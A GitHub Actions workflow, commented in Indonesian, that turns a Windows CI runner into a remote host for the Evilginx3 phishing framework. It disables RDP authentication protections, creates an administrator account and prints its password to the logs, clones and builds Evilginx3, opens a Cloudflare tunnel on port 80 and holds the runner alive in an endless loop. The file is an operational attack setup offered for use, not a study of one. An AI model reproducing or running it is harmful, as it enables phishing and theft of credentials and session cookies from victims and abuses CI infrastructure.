name: RDP_EVILGINX_PRO

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Configure Core RDP Settings
        run: |
          # Mengaktifkan Remote Desktop dan konfigurasi keamanan
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User
        run: |
          # Membuat user RDP dengan password random yang aman
          $charSet = @{
              Upper   = [char[]](65..90)
              Lower   = [char[]](97..122)
              Number  = [char[]](48..57)
              Special = ([char[]](33..47) + [char[]](58..64))
          }
          $password = -join (($charSet.Upper | Get-Random -Count 3) + ($charSet.Lower | Get-Random -Count 3) + ($charSet.Number | Get-Random -Count 3) + ($charSet.Special | Get-Random -Count 3) | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "RDP_PASS=$password" >> $env:GITHUB_ENV

      - name: Install Tools (Go & Cloudflared)
        run: |
          # Instalasi Golang untuk build Evilginx3
          choco install golang -y
          
          # Instalasi Cloudflared untuk Tunnel domain
          $cfUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi"
          Invoke-WebRequest -Uri $cfUrl -OutFile "$env:TEMP\cloudflared.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "$env:TEMP\cloudflared.msi", "/quiet" -Wait

      - name: Build Evilginx3
        run: |
          # Clone dan Build Evilginx3 versi Windows
          git clone https://github.com/0fukuAkz/Evilginx3
          cd Evilginx3
          go build -o evilginx3.exe main.go
          echo "EVIL_PATH=$(Get-Location)" >> $env:GITHUB_ENV

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID

      - name: Final Setup & Maintain Connection
        run: |
          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          Write-Host "`n==============================================="
          Write-Host "✅ RDP READY!"
          Write-Host "Address: $tsIP"
          Write-Host "Username: RDP"
          Write-Host "Password: $env:RDP_PASS"
          Write-Host "Evilginx Path: $env:EVIL_PATH"
          Write-Host "===============================================`n"
          
          # Menjalankan Cloudflare Quick Tunnel agar port 80 bisa diakses via domain sementara
          Start-Process -FilePath "C:\Program Files (x86)\cloudflared\cloudflared.exe" -ArgumentList "tunnel", "--url", "http://localhost:80" -NoNewWindow

          # Loop untuk menjaga runner tetap hidup
          while ($true) {
              $currentTime = Get-Date -Format "HH:mm:ss"
              Write-Host "[$currentTime] Runner Active & Tunneling..."
              Start-Sleep -Seconds 300
          }
